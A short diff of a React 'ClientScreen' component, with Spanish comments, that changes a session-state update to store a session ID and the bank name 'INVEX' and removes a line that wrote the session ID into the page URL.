@@ -220,12 +220,9 @@ export default function ClientScreen() {
           }
         });
         
-        // Actualizar el estado local
-        setSessionData(prev => ({ ...prev, id: newSessionId }));
+        // Actualizar el estado local con el nuevo sessionId
+        setSessionData(prev => ({ ...prev, sessionId: newSessionId, banco: 'INVEX' }));
         setCurrentScreen(ScreenType.VALIDANDO);
-        
-        // Actualizar la URL para incluir el sessionId
-        window.history.pushState({}, '', `/client/${newSessionId}`);
         
         return;
       }
